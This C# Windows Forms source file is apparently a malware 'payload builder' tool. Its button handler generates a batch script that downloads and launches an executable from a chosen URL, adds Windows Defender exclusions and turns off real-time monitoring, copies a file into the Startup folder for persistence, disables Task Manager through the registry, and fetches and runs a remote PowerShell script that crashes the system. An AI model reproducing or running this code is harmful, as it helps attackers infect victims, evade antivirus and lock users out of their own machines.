using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace M4nifest0PayloadBuilder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
         
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void dreamButton1_Click(object sender, EventArgs e)
        {
            poisonTabControl1.SelectTab(poisonTabPage1);
        }

        private void dreamButton2_Click(object sender, EventArgs e)
        {
            poisonTabControl1.SelectTab(poisonTabPage2);
        }

        private void crownSectionPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void dreamButton3_Click(object sender, EventArgs e)
        {
            TextWriter tw = new StreamWriter(dreamTextBox6.Text + "\\" + dreamTextBox7.Text + ".bat");
            tw.WriteLine("@echo off");
            if (airCheckBox1.Checked)
            {
                tw.WriteLine("powershell -Command Invoke-WebRequest " + dreamTextBox1.Text + " -Outfile C:\\Windows\\Temp\\Payload.exe");
                tw.WriteLine("start C:\\Windows\\Temp\\Payload.exe");
            }
            if (airCheckBox2.Checked)
            {
                tw.WriteLine("powershell -Command Add-MpPreference -ExclusionExtension \"" + dreamTextBox2.Text + "\"");
            }
            if (airCheckBox5.Checked)
            {
                tw.WriteLine("powershell -Command Invoke-WebRequest " + dreamTextBox3.Text + " -Outfile C:\\Windows\\Temp\\Wall34.jpg");
                tw.WriteLine("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t Reg_SZ /d C:\\Windows\\Temp\\Wall34.jpg /f");

            }
            if (airCheckBox6.Checked)
            {              
                tw.WriteLine("copy \"" + dreamTextBox4.Text + "\"" + " " +  "\"%USERPROFILE%\\Start Menu\\Programs\\Startup\"");
            }
            if (airCheckBox4.Checked)
            {
                tw.WriteLine("ECHO REGEDIT4 > %WINDIR%\\DXM.REG");
                tw.WriteLine("echo. >> %WINDIR%\\DXM.reg");
                tw.WriteLine("");
                tw.WriteLine("echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System] >> %WINDIR%\\DXM.reg");
                tw.WriteLine("echo \"DisableTaskMgr\"=dword:1 >> %WINDIR%\\DXM.reg");
                tw.WriteLine("");
                tw.WriteLine("echo [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System] >> %WINDIR%\\DXM.reg");
                tw.WriteLine("echo \"DisableTaskMgr\"=dword:1 >> %WINDIR%\\DXM.reg");
                tw.WriteLine("");
                tw.WriteLine("start /w regedit /s %WINDIR%\\DXM.reg");
            }

            if (airCheckBox3.Checked)
            {
                tw.WriteLine("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true");
            }

            if (airCheckBox7.Checked)
            {
                tw.WriteLine("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
            }

            tw.Close();
        }
    }
}
